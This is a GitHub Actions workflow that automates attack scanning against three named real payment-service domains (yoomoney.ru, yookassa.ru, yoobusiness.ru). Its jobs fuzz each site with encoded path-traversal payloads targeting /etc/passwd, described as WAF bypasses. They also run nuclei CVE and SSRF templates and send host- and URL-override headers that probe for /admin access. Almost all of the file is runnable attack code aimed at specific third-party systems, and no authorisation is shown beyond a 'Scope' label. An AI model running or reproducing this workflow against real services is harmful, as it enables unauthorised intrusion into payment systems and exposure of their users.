name: "Heavy-Duty Middleware Escalation â€” YooMoney"

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write
  actions: read

env:
  TARGETS_FILE: targets.txt

jobs:

  prep_targets:
    runs-on: ubuntu-latest
    steps:
      - name: ğŸ§¬ Build Scope Targets
        run: |
          cat <<EOF > $TARGETS_FILE
          https://yoomoney.ru
          https://yookassa.ru
          https://yoobusiness.ru
          EOF
      - uses: actions/upload-artifact@v4
        with:
          name: targets
          path: ${{ env.TARGETS_FILE }}

  fuzz_traversal:
    needs: prep_targets
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/download-artifact@v4
        with:
          name: targets

      - name: Install FFUF
        run: |
          go install github.com/ffuf/ffuf/v2@latest
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: ğŸ“ WAF Bypass Payloads
        run: |
          cat <<EOF > payloads.txt
          ..%2f..%2f..%2fetc/passwd
          ..%252f..%252fetc/passwd
          .%2e/%2e%2e/%2e%2e/etc/passwd
          ..%c0%af..%c0%afetc/passwd
          %2e%2e%2f%2e%2e%2fetc%2fpasswd
          EOF

      - name: ğŸ¯ Parallel Fuzz
        run: |
          while read target; do
            ffuf -u "$target/FUZZ" \
              -w payloads.txt \
              -mc 200,403,500 \
              -rate 4 \
              -o "traversal_$(echo $target | sed 's/https:\/\///').json"
          done < targets.txt

      - uses: actions/upload-artifact@v4
        with:
          name: traversal-results
          path: traversal_*.json

  nuclei_scan:
    needs: prep_targets
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: targets

      - name: Install Nuclei
        run: |
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: â˜¢ï¸ CVE / SSRF Scan
        run: |
          nuclei -l targets.txt \
            -t http/vulnerabilities/nextjs/ \
            -t http/cves/ \
            -rate-limit 5 \
            -o nuclei_results.txt

      - uses: actions/upload-artifact@v4
        with:
          name: nuclei-results
          path: nuclei_results.txt

  header_smuggling:
    needs: prep_targets
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: targets

      - name: ğŸ•µï¸ Header & Host Injection Tests
        run: |
          while read target; do
            curl -k -I "$target" \
              -H "X-Forwarded-Host: 127.0.0.1" \
              -H "X-Original-URL: /admin" \
              -H "X-Rewrite-URL: /admin" \
              >> header_tests.txt
          done < targets.txt

      - uses: actions/upload-artifact@v4
        with:
          name: header-smuggling-results
          path: header_tests.txt
